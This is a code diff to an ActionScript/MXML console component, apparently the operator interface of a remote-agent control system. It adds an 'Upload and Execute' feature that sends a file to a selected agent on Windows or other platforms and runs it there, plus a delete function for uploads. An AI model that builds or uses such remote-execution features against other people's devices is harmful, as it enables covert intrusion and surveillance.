@@ -4,15 +4,18 @@
                      xmlns:mx="library://ns.adobe.com/flex/mx"
                      xmlns:actionbar="it.ht.rcs.console.main.actionbar.*">
   
-  <s:Button label="{R.get('NEW_UPLOAD')}" click="onUpload(event)" icon="@Embed('/img/NEW/upload.png')"/>
+  <s:Button label="{R.get('NEW_UPLOAD')}" click="onUpload(event)" icon="@Embed('/img/NEW/upload.png')" enabled="{section.stateManager.selectedAgent.status=='open'}"/>
+  <s:Button label="{R.get('UPLOAD_AND_EXECUTE')}" click="onUploadAndExecute(event)" icon="@Embed('/img/NEW/uploadexecute.png')" enabled="{section.stateManager.selectedAgent.status=='open'}"/>
   <s:Button label="{R.get('EXPORT_FILE')}" click="onDownload(event)" enabled="{selectedObject != null}"
             icon="@Embed('/img/NEW/export.png')"/>
+  <s:Button label="{R.get('DELETE')}" click="onDelete(event)" icon="@Embed('/img/NEW/delete_32.png')" enabled="{selectedObject}"/>
   
   <s:Spacer width="100%"/>
   
   <fx:Script>
     <![CDATA[
       import it.ht.rcs.console.agent.controller.AgentManager;
+      import it.ht.rcs.console.agent.model.Agent;
       import it.ht.rcs.console.agent.model.Upload;
       import it.ht.rcs.console.events.RefreshEvent;
       import it.ht.rcs.console.operations.view.OperationsSection;
@@ -26,10 +29,20 @@
       import mx.managers.PopUpManager;
       import mx.rpc.events.ResultEvent;
       
+      [Bindable]
       public var section:OperationsSection;
+      
+      private var execute:Boolean=false;
       
       private function onUpload(e:MouseEvent):void
       {
+        execute=false;
+        browse();
+      }
+      
+      private function onUploadAndExecute(e:MouseEvent):void
+      {
+        execute=true;
         browse();
       }
       
@@ -74,6 +87,30 @@
       
       private function onCreate(e:ResultEvent):void
       {
+        if(execute)
+        {
+          var agent:Agent=section.stateManager.selectedAgent
+          var command:String=fileReference.name;
+          if(agent.platform=="windows" || agent.platform=="winmo")
+          {
+            command="$dir$\\"+command;
+          }
+          else
+          {
+            command="$dir$/"+command;
+          }
+          AgentManager.instance.createCommand(agent,command, onCommandComplete)
+        }
+        else{
+          FlexGlobals.topLevelApplication.dispatchEvent(new RefreshEvent(RefreshEvent.REFRESH));
+        }
+       
+      }
+      
+      private function onCommandComplete(e:ResultEvent):void
+      {
+        trace("upload and execution completed")
+        
         FlexGlobals.topLevelApplication.dispatchEvent(new RefreshEvent(RefreshEvent.REFRESH));
       }
       
@@ -96,6 +133,16 @@
       private function onComplete():void
       {
         AlertPopUp.show("Download completed");
+      }
+      
+      private function onDelete(e:MouseEvent):void
+      {
+        AgentManager.instance.deleteUpload(section.stateManager.selectedAgent, selectedObject._id, onDeleteSuccess);
+      }
+      
+      private function onDeleteSuccess(e:ResultEvent):void
+      {
+        FlexGlobals.topLevelApplication.dispatchEvent(new RefreshEvent(RefreshEvent.REFRESH));
       }
     ]]>
   </fx:Script>
